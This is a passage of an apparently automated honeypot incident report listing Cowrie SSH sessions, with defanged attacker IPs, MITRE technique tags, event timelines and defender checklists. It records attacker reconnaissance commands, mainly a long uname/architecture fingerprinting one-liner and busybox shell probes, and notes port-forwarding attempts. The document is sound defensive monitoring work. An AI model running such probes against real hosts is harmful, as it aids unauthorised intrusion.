| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:27:12` | `cowrie.session.connect` |
| `2026-07-08 20:27:12` | `cowrie.client.version` |
| `2026-07-08 20:27:12` | `cowrie.client.kex` |
| `2026-07-08 20:27:14` | `cowrie.login.success` |
| `2026-07-08 20:27:15` | `cowrie.session.params` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.success` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.command.input` |
| `2026-07-08 20:27:15` | `cowrie.log.closed` |
| `2026-07-08 20:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5da363bd80

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 20:27 |
| **Last Seen** | 2026-07-08 20:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:27:25` | `cowrie.session.connect` |
| `2026-07-08 20:27:26` | `cowrie.client.version` |
| `2026-07-08 20:27:26` | `cowrie.client.kex` |
| `2026-07-08 20:27:31` | `cowrie.login.success` |
| `2026-07-08 20:27:34` | `cowrie.session.params` |
| `2026-07-08 20:27:34` | `cowrie.command.input` |
| `2026-07-08 20:27:35` | `cowrie.log.closed` |
| `2026-07-08 20:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-973a709957ac

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 20:27 |
| **Last Seen** | 2026-07-08 20:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:27:31` | `cowrie.session.connect` |
| `2026-07-08 20:27:31` | `cowrie.client.version` |
| `2026-07-08 20:27:31` | `cowrie.client.kex` |
| `2026-07-08 20:27:32` | `cowrie.login.success` |
| `2026-07-08 20:27:33` | `cowrie.session.params` |
| `2026-07-08 20:27:33` | `cowrie.command.input` |
| `2026-07-08 20:27:34` | `cowrie.log.closed` |
| `2026-07-08 20:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04160fb39f60

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 20:27 |
| **Last Seen** | 2026-07-08 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:27:49` | `cowrie.session.connect` |
| `2026-07-08 20:27:49` | `cowrie.client.version` |
| `2026-07-08 20:27:49` | `cowrie.client.kex` |
| `2026-07-08 20:27:50` | `cowrie.login.success` |
| `2026-07-08 20:27:50` | `cowrie.session.params` |
| `2026-07-08 20:27:50` | `cowrie.command.input` |
| `2026-07-08 20:27:50` | `cowrie.log.closed` |
| `2026-07-08 20:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45d15c7afe0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 20:29 |
| **Last Seen** | 2026-07-08 20:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:29:27` | `cowrie.session.connect` |
| `2026-07-08 20:29:27` | `cowrie.client.version` |
| `2026-07-08 20:29:28` | `cowrie.client.kex` |
| `2026-07-08 20:29:28` | `cowrie.login.success` |
| `2026-07-08 20:29:28` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:29:28` | `cowrie.direct-tcpip.data` |
| `2026-07-08 20:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac75d6188cba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:29 |
| **Last Seen** | 2026-07-08 20:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:29:34` | `cowrie.session.connect` |
| `2026-07-08 20:29:34` | `cowrie.client.version` |
| `2026-07-08 20:29:34` | `cowrie.client.kex` |
| `2026-07-08 20:29:35` | `cowrie.login.success` |
| `2026-07-08 20:29:36` | `cowrie.session.params` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.success` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:36` | `cowrie.command.input` |
| `2026-07-08 20:29:37` | `cowrie.log.closed` |
| `2026-07-08 20:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd2e54ac557

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:31 |
| **Last Seen** | 2026-07-08 20:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:31:59` | `cowrie.session.connect` |
| `2026-07-08 20:31:59` | `cowrie.client.version` |
| `2026-07-08 20:31:59` | `cowrie.client.kex` |
| `2026-07-08 20:31:59` | `cowrie.login.success` |
| `2026-07-08 20:32:01` | `cowrie.session.params` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.success` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.command.input` |
| `2026-07-08 20:32:01` | `cowrie.log.closed` |
| `2026-07-08 20:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ce3a4b791d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]90` |
| **First Seen** | 2026-07-08 20:32 |
| **Last Seen** | 2026-07-08 20:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:32:58` | `cowrie.session.connect` |
| `2026-07-08 20:32:59` | `cowrie.login.success` |
| `2026-07-08 20:32:59` | `cowrie.session.params` |
| `2026-07-08 20:33:00` | `cowrie.command.input` |
| `2026-07-08 20:33:00` | `cowrie.command.input` |
| `2026-07-08 20:33:01` | `cowrie.command.input` |
| `2026-07-08 20:33:01` | `cowrie.command.input` |
| `2026-07-08 20:33:01` | `cowrie.command.failed` |
| `2026-07-08 20:33:02` | `cowrie.log.closed` |
| `2026-07-08 20:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]90` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a50ff600449a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:34 |
| **Last Seen** | 2026-07-08 20:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:34:23` | `cowrie.session.connect` |
| `2026-07-08 20:34:23` | `cowrie.client.version` |
| `2026-07-08 20:34:23` | `cowrie.client.kex` |
| `2026-07-08 20:34:25` | `cowrie.login.success` |
| `2026-07-08 20:34:26` | `cowrie.session.params` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.success` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.command.input` |
| `2026-07-08 20:34:26` | `cowrie.log.closed` |
| `2026-07-08 20:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f57dcf3301a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 20:35 |
| **Last Seen** | 2026-07-08 20:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:35:46` | `cowrie.session.connect` |
| `2026-07-08 20:35:47` | `cowrie.client.version` |
| `2026-07-08 20:35:47` | `cowrie.client.kex` |
| `2026-07-08 20:35:51` | `cowrie.login.success` |
| `2026-07-08 20:35:54` | `cowrie.session.params` |
| `2026-07-08 20:35:54` | `cowrie.command.input` |
| `2026-07-08 20:35:55` | `cowrie.log.closed` |
| `2026-07-08 20:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7fd9d10bb66

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:36 |
| **Last Seen** | 2026-07-08 20:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:36:49` | `cowrie.session.connect` |
| `2026-07-08 20:36:49` | `cowrie.client.version` |
| `2026-07-08 20:36:49` | `cowrie.client.kex` |
| `2026-07-08 20:36:49` | `cowrie.login.success` |
| `2026-07-08 20:36:51` | `cowrie.session.params` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.success` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.command.input` |
| `2026-07-08 20:36:51` | `cowrie.log.closed` |
| `2026-07-08 20:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f807b6002b7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 20:38 |
| **Last Seen** | 2026-07-08 20:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:38:40` | `cowrie.session.connect` |
| `2026-07-08 20:38:40` | `cowrie.client.version` |
| `2026-07-08 20:38:40` | `cowrie.client.kex` |
| `2026-07-08 20:38:40` | `cowrie.login.success` |
| `2026-07-08 20:38:41` | `cowrie.session.params` |
| `2026-07-08 20:38:41` | `cowrie.command.input` |
| `2026-07-08 20:38:42` | `cowrie.log.closed` |
| `2026-07-08 20:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-267cfcb0be3f

| Field | Detail |
|---|---|
| **Source IP** | `191.36.152[.]28` |
| **First Seen** | 2026-07-08 20:38 |
| **Last Seen** | 2026-07-08 20:43 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:38:46` | `cowrie.session.connect` |
| `2026-07-08 20:38:47` | `cowrie.client.version` |
| `2026-07-08 20:38:47` | `cowrie.client.kex` |
| `2026-07-08 20:38:49` | `cowrie.login.success` |
| `2026-07-08 20:38:50` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.36.152[.]28` to AbuseIPDB if not already reported
- [ ] Block `191.36.152[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fa0d7eb3aff

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-07-08 20:38 |
| **Last Seen** | 2026-07-08 20:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:38:59` | `cowrie.session.connect` |
| `2026-07-08 20:39:00` | `cowrie.client.version` |
| `2026-07-08 20:39:00` | `cowrie.client.kex` |
| `2026-07-08 20:39:01` | `cowrie.login.success` |
| `2026-07-08 20:39:01` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c9e75baa97

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:39 |
| **Last Seen** | 2026-07-08 20:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:39:19` | `cowrie.session.connect` |
| `2026-07-08 20:39:19` | `cowrie.client.version` |
| `2026-07-08 20:39:19` | `cowrie.client.kex` |
| `2026-07-08 20:39:19` | `cowrie.login.success` |
| `2026-07-08 20:39:21` | `cowrie.session.params` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.success` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.command.input` |
| `2026-07-08 20:39:21` | `cowrie.log.closed` |
| `2026-07-08 20:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36533d527c64

| Field | Detail |
|---|---|
| **Source IP** | `111.42.132[.]19` |
| **First Seen** | 2026-07-08 20:41 |
| **Last Seen** | 2026-07-08 20:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:41:11` | `cowrie.session.connect` |
| `2026-07-08 20:41:11` | `cowrie.client.version` |
| `2026-07-08 20:41:11` | `cowrie.client.kex` |
| `2026-07-08 20:41:14` | `cowrie.login.success` |
| `2026-07-08 20:41:15` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.132[.]19` to AbuseIPDB if not already reported
- [ ] Block `111.42.132[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f142570286a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 20:41 |
| **Last Seen** | 2026-07-08 20:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:41:46` | `cowrie.session.connect` |
| `2026-07-08 20:41:46` | `cowrie.client.version` |
| `2026-07-08 20:41:46` | `cowrie.client.kex` |
| `2026-07-08 20:41:47` | `cowrie.login.success` |
| `2026-07-08 20:41:48` | `cowrie.session.params` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.success` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.command.input` |
| `2026-07-08 20:41:48` | `cowrie.log.closed` |
| `2026-07-08 20:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f691caa721c

| Field | Detail |
|---|---|
| **Source IP** | `36.39.140[.]2` |
| **First Seen** | 2026-07-08 20:43 |
| **Last Seen** | 2026-07-08 20:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 20:43:34` | `cowrie.session.connect` |
| `2026-07-08 20:43:35` | `cowrie.client.version` |
| `2026-07-08 20:43:35` | `cowrie.client.kex` |
| `2026-07-08 20:43:37` | `cowrie.login.success` |
| `2026-07-08 20:43:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 20:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.39.140[.]2` to AbuseIPDB if not already reported
- [ ] Block `36.39.140[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
